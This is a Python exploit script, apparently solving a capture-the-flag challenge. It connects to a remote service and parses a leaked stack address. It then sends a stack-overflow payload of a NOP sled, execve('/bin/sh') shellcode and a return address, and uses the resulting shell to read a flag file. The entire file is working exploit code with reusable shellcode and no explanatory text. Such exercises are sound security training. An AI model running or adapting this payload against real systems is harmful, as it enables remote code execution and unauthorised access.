#!/usr/bin/env python3
import socket
import time
import struct


def read_from_socket(s, stop):
    # Read from socket until we get a stop string
    data = ''
    while not stop in data:
        temp = s.recv(1024)
        data += temp.decode()
    return data

# target info
hostname = 'thekidofarcrania.com'
port = 4902
addr = socket.gethostbyname(hostname)

# connect
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((addr, port))

# Show the received data
data = read_from_socket(s, 'text:')
print(data)

# Get the address of the stack
addr_ind = data.index('0x')
addr = data[addr_ind + 2:addr_ind + 10]
print(f'addr = {addr}')
addr = int(addr, 16)
addr = hex(addr)
addr = int(addr, 16)
addr = struct.pack('<I', addr)

# Make the payload
nop = b'\x90' * 22
shellcode = b"\xeb\x18\x5e\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c\xb0\x0b\x8d\x1e\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"
ret_addr = addr
payload = nop + shellcode + ret_addr

# Send the payload
sent = s.send(payload)
time.sleep(0.1)
s.shutdown(socket.SHUT_WR)

# See the result
print(read_from_socket(s, 'address:'))

command = b'cat /flag2.txt'
sent = s.send(command)
time.sleep(0.1)
s.shutdown(socket.SHUT_WR)
print(read_from_socket(s, '}'))
s.close()
